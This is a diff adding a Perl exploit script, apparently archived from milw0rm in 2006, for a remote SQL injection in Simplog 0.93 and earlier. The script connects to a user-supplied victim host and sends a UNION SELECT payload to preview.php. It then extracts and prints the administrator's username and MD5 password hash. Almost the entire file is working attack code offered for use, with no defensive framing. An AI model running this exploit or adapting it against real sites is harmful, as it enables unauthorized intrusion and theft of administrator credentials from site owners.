@@ -1,0 +1,60 @@
+#!/usr/bin/perl
+#Method found & Exploit scripted by nukedx
+#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
+#Original advisory: http://www.nukedx.com/?viewdoc=25
+#Usage: simplog.pl <host> <path>
+use IO::Socket;
+if(@ARGV != 2) { usage(); }
+else { exploit(); }
+sub header()
+{
+  print "\n- NukedX Security Advisory Nr.2006-25\r\n";
+  print "- Simplog <= 0.93 Remote SQL Injection Exploit\r\n";
+}
+sub usage() 
+{
+  header();
+  print "- Usage: $0 <host> <path>\r\n";
+  print "- <host> -> Victim's host ex: www.victim.com\r\n";
+  print "- <path> -> Path to Simplog ex: /simplog/\r\n";
+  exit();
+}
+sub exploit () 
+{
+  #Our variables...
+  $spserver = $ARGV[0];
+  $spserver =~ s/(http:\/\/)//eg;
+  $sphost   = "http://".$spserver;
+  $spdir    = $ARGV[1];
+  $spport   = "80";
+  $sptar    = "preview.php?adm=tem&blogid=1&tid=";
+  $spxp     = "-1/**/UNION/**/SELECT/**/concat(25552,login,25553,password,25554)/**/from/**/blog_users/**/where/**/admin=1/*";
+  $spreq    = $sphost.$spdir.$sptar.$spxp;
+  #Sending data...
+  header();
+  print "- Trying to connect: $spserver\r\n";
+  $sp = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$spserver", PeerPort => "$spport") || die "- Connection failed...\n";
+  print $sp "GET $spreq HTTP/1.1\n";
+  print $sp "Accept: */*\n";
+  print $sp "Referer: $sphost\n";
+  print $sp "Accept-Language: tr\n";
+  print $sp "User-Agent: NukeZilla\n";
+  print $sp "Cache-Control: no-cache\n";
+  print $sp "Host: $spserver\n";
+  print $sp "Connection: close\n\n";
+  print "- Connected...\r\n";
+  while ($answer = <$sp>) {
+    if ($answer =~ /25552(.*?)25553([\d,a-f]{32})25554/) {
+      print "- Exploit succeed!\r\n";
+      print "- Username: $1\r\n";
+      print "- MD5 HASH of PASSWORD: $2\r\n";
+      exit();
+    }
+  }
+  #Exploit failed...
+  print "- Exploit failed\n"
+}
+
+# nukedx.com [2006-04-21]
+
+# milw0rm.com [2006-04-21]
